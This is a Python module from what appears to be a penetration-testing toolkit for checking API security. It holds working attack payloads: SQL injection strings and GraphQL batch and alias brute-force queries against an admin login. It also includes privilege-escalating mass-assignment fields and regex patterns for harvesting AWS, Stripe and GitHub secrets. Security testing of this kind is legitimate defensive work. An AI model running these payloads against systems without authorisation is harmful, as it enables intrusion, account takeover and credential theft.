"""
modules/api_security.py
tmrswrr - API Security Testing
GraphQL introspection/injection, REST fuzzing, mass assignment, API key leakage
"""
import json
import os
import re

import requests

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    NEON_RED,
    NEON_YEL,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    section,
    success,
    warn,
)
from utils.http import (
    ScopeViolation,
    get_client,
    looks_like_notfound,
    notfound_signature,
)


def _out(name: str) -> str:
    d = str(OUTPUT_DIR)
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target() -> str:
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL")
        SESSION["target_url"] = url
    return url


def _req(url: str, method: str = "GET", data: str = "", timeout: int = 15,
         headers: dict | None = None):
    """One request through the engine. Returns the response, or None.

    Session cookies and the auth token are attached by utils.http itself, so no
    call site has to remember them - and every request here counts against the
    engagement rate limit like the rest of the run.
    """
    client = get_client()
    try:
        return client.request(method, url, data=data or None, timeout=timeout,
                              headers=headers)
    except (requests.RequestException, ScopeViolation) as exc:
        warn(f"request failed ({url}): {exc}")
        return None


def _body(response) -> str:
    return "" if response is None else (response.text or "")


#: Sent on every GraphQL request in this module.
JSON_HEADERS = {"Content-Type": "application/json"}


def graphql_introspection():
    section("GRAPHQL INTROSPECTION")
    url = _target()

    gql_paths = ["/graphql", "/graphiql", "/api/graphql", "/v1/graphql",
                 "/query", "/gql", "/api/query"]

    info("Discovering GraphQL endpoints...")
    client = get_client()
    signature = notfound_signature(client, url)
    gql_url = ""
    for path in gql_paths:
        # A GraphQL endpoint answers a *GET* with 400 "must provide query" far
        # more often than 200, so probe with the real thing: a POST carrying a
        # trivial query. A catch-all route that returns 200 for everything is
        # filtered out by the 404 signature and by requiring GraphQL-shaped JSON.
        resp = _req(url.rstrip("/") + path, method="POST",
                    data=json.dumps({"query": "{__typename}"}),
                    headers=JSON_HEADERS, timeout=8)
        if resp is None or looks_like_notfound(resp, signature):
            print(f"  {DIM}[-] {path}{RST}")
            continue
        body = _body(resp).lower()
        if "__typename" in body or "graphql" in body or '"errors"' in body:
            success(f"GraphQL endpoint: {url.rstrip('/') + path}")
            gql_url = url.rstrip("/") + path
            break
        print(f"  {DIM}[{resp.status_code}] {path}{RST}")

    if not gql_url:
        gql_url = prompt("GraphQL endpoint URL")
    if not gql_url:
        return

    # Introspection query
    introspection = json.dumps({
        "query": """
        {
          __schema {
            types { name kind fields { name type { name kind } } }
            queryType { fields { name args { name type { name } } description } }
            mutationType { fields { name args { name type { name } } } }
          }
        }
        """
    })

    info("Running full introspection query...")
    resp = _req(gql_url, method="POST", data=introspection, headers=JSON_HEADERS)
    out = _body(resp)

    if "__schema" in out or "queryType" in out:
        success("INTROSPECTION ENABLED - full schema disclosed!")
        out_file = _out("graphql_schema.json")
        with open(out_file, "w") as f:
            f.write(out)
        success(f"Schema saved → {out_file}")
        add_vuln("GraphQL Introspection Enabled", "Medium", "A05:2021",
                 "The endpoint answers __schema introspection, disclosing every type, "
                 "field, argument and mutation the API exposes.",
                 gql_url, evidence=getattr(resp, "evidence", None),
                 confidence="Confirmed", cwe="CWE-200")

        # Parse sensitive types/fields
        try:
            data = json.loads(out)
            types = data.get("data", {}).get("__schema", {}).get("types", [])
            sensitive_keywords = ["user", "admin", "password", "token", "secret",
                                  "key", "auth", "credential", "hash", "role"]
            print(f"\n  {NEON_CYN}Potentially sensitive types/fields:{RST}")
            for t in types:
                name = (t.get("name") or "").lower()
                if any(k in name for k in sensitive_keywords):
                    fields = [f.get("name") for f in (t.get("fields") or [])]
                    print(f"  {NEON_GRN}[!]{RST} {t['name']}: {fields[:10]}")
        except Exception:
            pass
    elif "errors" in out.lower():
        warn("Introspection may be disabled (got errors) - try field-by-field enumeration")
        print(f"  Response: {out[:300]}")
    else:
        info(f"Response: {out[:200]}")


def graphql_injection():
    section("GRAPHQL INJECTION ATTACKS")
    url = _target()

    gql_url = prompt("GraphQL endpoint URL")
    if not gql_url:
        gql_url = f"{url}/graphql"

    print(f"""
  {NEON_CYN}GraphQL Injection Techniques:{RST}
""")

    # 1. Batch query abuse
    info("[1] Batch Query Abuse (DoS / rate limit bypass)...")
    batch = json.dumps([
        {"query": "{ __typename }"} for _ in range(100)
    ])
    resp = _req(gql_url, method="POST", data=batch, headers=JSON_HEADERS)
    out = _body(resp)
    if "__typename" in out:
        warn("Batch queries accepted - rate limit bypass possible!")
        add_vuln("GraphQL Batch Query Abuse", "Medium", "A04:2021",
                 "The server executed 100 queries sent in one batched request, so any "
                 "per-request rate limit can be multiplied by the batch size.",
                 gql_url, evidence=getattr(resp, "evidence", None),
                 confidence="Confirmed", cwe="CWE-770")
    else:
        print(f"  {DIM}Batch: {out[:100]}{RST}")

    # 2. Alias-based brute force
    info("[2] Alias-Based Rate Limit Bypass...")
    alias_q = json.dumps({"query": """
    {
      a1: login(username:"admin",password:"password1") { token }
      a2: login(username:"admin",password:"password2") { token }
      a3: login(username:"admin",password:"123456") { token }
    }
    """})
    resp2 = _req(gql_url, method="POST", data=alias_q, headers=JSON_HEADERS)
    out2 = _body(resp2)
    # "token" appearing anywhere is not proof; the aliases must have been *run*,
    # which shows up as three distinct result keys rather than a schema error.
    aliases_executed = all(f'"a{i}"' in out2 for i in (1, 2, 3))
    if aliases_executed:
        success("All three login aliases executed in one request")
        add_vuln("GraphQL Alias Brute Force", "High", "A07:2021",
                 "Three login attempts sent as aliases in a single request were all "
                 "executed, so a per-request rate limit does not bound login attempts.",
                 gql_url, evidence=getattr(resp2, "evidence", None),
                 confidence="Confirmed", cwe="CWE-307")
    else:
        print(f"  {DIM}Alias: {out2[:100]}{RST}")

    # 3. SQL injection via GraphQL argument
    info("[3] SQLi via GraphQL argument...")
    sqli_payloads = [
        '{ user(id: "1 OR 1=1") { id name email } }',
        '{ users(filter: "1=1") { nodes { id email } } }',
        '{ search(term: "test\' OR \'1\'=\'1") { results { id } } }',
    ]
    # "syntax" alone matches GraphQL's own "Syntax Error" for a malformed query,
    # which every one of these payloads can trigger without touching a database.
    db_errors = ("sql syntax", "mysql", "ora-0", "psql", "postgresql", "sqlite",
                 "odbc", "syntax error at or near", "unclosed quotation")
    for p in sqli_payloads:
        payload = json.dumps({"query": p})
        resp3 = _req(gql_url, method="POST", data=payload, headers=JSON_HEADERS)
        out3 = _body(resp3)
        hit = next((e for e in db_errors if e in out3.lower()), None)
        if hit:
            success(f"SQLi error via GraphQL: {p[:60]}")
            add_vuln("SQL Injection via GraphQL", "Critical", "A03:2021",
                     f"GraphQL argument injection produced a database error ('{hit}'): "
                     f"{p[:120]}",
                     gql_url, evidence=getattr(resp3, "evidence", None),
                     confidence="Confirmed", cwe="CWE-89")
        else:
            print(f"  {DIM}{p[:50]} → {out3[:50]}{RST}")


def rest_api_enum():
    section("REST API ENUMERATION")
    url = _target()

    info("Discovering REST API endpoints and versioning...")
    client = get_client()
    signature = notfound_signature(client, url)

    api_bases = ["/api", "/api/v1", "/api/v2", "/api/v3", "/rest", "/v1", "/v2"]
    api_resources = [
        "users", "admin", "accounts", "orders", "products", "customers",
        "tokens", "keys", "config", "settings", "debug", "health", "metrics",
        "auth", "login", "register", "password", "profile", "me", "whoami",
        "billing", "payments", "subscriptions", "webhooks", "export", "import",
    ]

    found = []
    info(f"Fuzzing {len(api_bases) * len(api_resources)} API paths...")
    for base in api_bases:
        for resource in api_resources:
            full = f"{url.rstrip('/')}{base}/{resource}"
            resp = client.safe_get(full, timeout=6)
            if resp is None or looks_like_notfound(resp, signature):
                continue
            code = resp.status_code
            if code in (200, 201, 401, 403):
                color = NEON_GRN if code == 200 else NEON_YEL
                print(f"  {color}[{code}]{RST} {full}")
                found.append((full, str(code)))
                if code == 200:
                    add_vuln(f"API Endpoint Accessible: {base}/{resource}", "Info",
                             "A01:2021",
                             f"HTTP 200 with a body unlike the application's 404 page "
                             f"({len(resp.text)} bytes).",
                             full, evidence=resp.evidence,
                             confidence="Firm", cwe="")

    if found:
        out_file = _out("api_endpoints.txt")
        with open(out_file, "w") as f:
            f.write("\n".join(f"{c} {u}" for u, c in found))
        success(f"{len(found)} API endpoints found → {out_file}")

    # Check HTTP methods per endpoint
    if found:
        info("Checking allowed HTTP methods on discovered endpoints...")
        for api_url, _ in found[:5]:
            resp = _req(api_url, method="OPTIONS", timeout=6)
            if resp is None:
                continue
            methods = (resp.headers.get("Allow")
                       or resp.headers.get("Access-Control-Allow-Methods") or "").strip()
            if not methods:
                continue
            print(f"  {NEON_CYN}{api_url}:{RST} Allow: {methods}")
            if any(m in methods.upper() for m in ("DELETE", "PUT", "PATCH")):
                warn(f"State-changing methods exposed: {methods}")
                add_vuln("Dangerous HTTP Methods Exposed", "Low", "A05:2021",
                         f"OPTIONS advertises {methods} on {api_url}. Confirm each one "
                         "is authorised before reporting - advertising is not access.",
                         api_url, evidence=resp.evidence,
                         confidence="Tentative", cwe="CWE-650")


def api_mass_assignment():
    section("API MASS ASSIGNMENT (PARAMETER POLLUTION)")
    url = _target()

    info("Testing mass assignment via extra JSON/form fields...")
    endpoint = prompt("API endpoint (e.g. /api/user/profile or /api/register)")
    normal   = prompt("Normal JSON body (e.g. {\"name\":\"test\"})")

    if not endpoint:
        return

    extra_fields = [
        '"role":"admin"',
        '"isAdmin":true',
        '"admin":true',
        '"is_staff":true',
        '"permissions":["admin"]',
        '"balance":99999',
        '"credits":99999',
        '"subscription":"premium"',
        '"verified":true',
        '"email_verified":true',
    ]

    endpoint_url = url.rstrip("/") + "/" + endpoint.lstrip("/")

    # What does this endpoint do with a body it fully accepts? Without that,
    # "success" in the response says nothing about the injected field.
    control = _req(endpoint_url, method="POST", data=normal or "{}",
                   headers=JSON_HEADERS)
    if control is None:
        warn("Control request failed - cannot tell an accepted field from a rejected one.")
        return
    info(f"Control response: HTTP {control.status_code}, {len(control.text)} bytes")

    info(f"Injecting {len(extra_fields)} privilege escalation fields...")
    for field in extra_fields:
        try:
            base = json.loads(normal) if normal else {}
            key, _, val = field.strip('"').partition('":')
            base[key.strip('"')] = json.loads(val.strip())
            test_json = json.dumps(base)
        except Exception:
            test_json = f"{{{normal.strip('{}')}, {field}}}"

        resp = _req(endpoint_url, method="POST", data=test_json, headers=JSON_HEADERS)
        if resp is None:
            print(f"  {DIM}[!] {field} (request failed){RST}")
            continue
        # The field is interesting when the endpoint behaves *differently* with
        # it than without it, or when the server echoes it straight back.
        key = field.split(":")[0].strip('"')
        echoed = f'"{key}"' in resp.text
        changed = (resp.status_code != control.status_code
                   or abs(len(resp.text) - len(control.text)) > 16)
        if echoed or changed:
            warn(f"[?] {field} changed the response - verify whether it took effect")
            print(f"  Response: {resp.text[:150]}")
            add_vuln(f"Possible Mass Assignment: {key}", "High", "A08:2021",
                     f"Adding `{field}` to the request body "
                     + ("was echoed back in the response"
                        if echoed else
                        f"changed the response (HTTP {resp.status_code} vs "
                        f"{control.status_code}, {len(resp.text)} vs "
                        f"{len(control.text)} bytes)")
                     + ". Re-read the object as a low-privilege user to confirm the "
                       "value was actually persisted.",
                     endpoint_url, evidence=resp.evidence,
                     confidence="Tentative", cwe="CWE-915")
        else:
            print(f"  {DIM}[-] {field}{RST}")


def api_key_hunting():
    section("API KEY & TOKEN DISCOVERY")
    url = _target()

    info("Searching page source and JavaScript for exposed API keys/tokens...")
    pages = [url, f"{url}/static/app.js", f"{url}/assets/bundle.js",
             f"{url}/js/main.js", f"{url}/api-docs", f"{url}/swagger.json"]

    patterns = {
        "AWS Access Key":     r"AKIA[0-9A-Z]{16}",
        "AWS Secret Key":     r'["\'](?:[A-Za-z0-9+/]{40})["\']',
        "Google API Key":     r"AIza[0-9A-Za-z-_]{35}",
        "Stripe Secret":      r"sk_live_[0-9a-zA-Z]{24,}",
        "Stripe Publishable": r"pk_live_[0-9a-zA-Z]{24,}",
        "GitHub Token":       r"ghp_[a-zA-Z0-9]{36}",
        "Slack Token":        r"xox[baprs]-[0-9A-Za-z]+",
        "Twilio":             r"AC[a-f0-9]{32}",
        "Bearer Token":       r"[Bb]earer [A-Za-z0-9._-]{20,}",
        "API Key param":      r'(?:api[_-]?key|apikey)\s*[=:]\s*["\'][^"\']{8,}["\']',
        "Private Key block":  r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----",
        "JWT":                r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}",
    }

    client = get_client()
    for page_url in pages:
        resp = client.safe_get(page_url, timeout=12)
        out = _body(resp)
        if not out or len(out) < 50:
            continue
        for name, pattern in patterns.items():
            matches = re.findall(pattern, out)
            if matches:
                success(f"{name} found in {page_url}:")
                for m in matches[:3]:
                    print(f"  {NEON_RED}{m[:80]}{RST}")
                add_vuln(f"Exposed {name}", "Critical", "A02:2021",
                         f"{name} pattern matched in the response body of {page_url}: "
                         f"{matches[0][:60]}",
                         page_url, evidence=resp.evidence,
                         confidence="Firm", cwe="CWE-798")


def run():
    print_banner("API SECURITY TESTING",
                 "GraphQL · REST Enumeration · Mass Assignment · API Key Hunting ")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} GraphQL Introspection {SOFT_WHITE}(schema disclosure){RST}
  {NEON_CYN}[2]{RST} GraphQL Injection      {SOFT_WHITE}(batch abuse, alias brute, SQLi){RST}
  {NEON_CYN}[3]{RST} REST API Enumeration   {SOFT_WHITE}(endpoint discovery, methods){RST}
  {NEON_CYN}[4]{RST} Mass Assignment        {SOFT_WHITE}(privilege escalation via extra fields){RST}
  {NEON_CYN}[5]{RST} API Key & Token Hunting {SOFT_WHITE}(JS/page source scanning){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0":
            break
        elif c == "1":
            graphql_introspection()
        elif c == "2":
            graphql_injection()
        elif c == "3":
            rest_api_enum()
        elif c == "4":
            api_mass_assignment()
        elif c == "5":
            api_key_hunting()
        save_session()
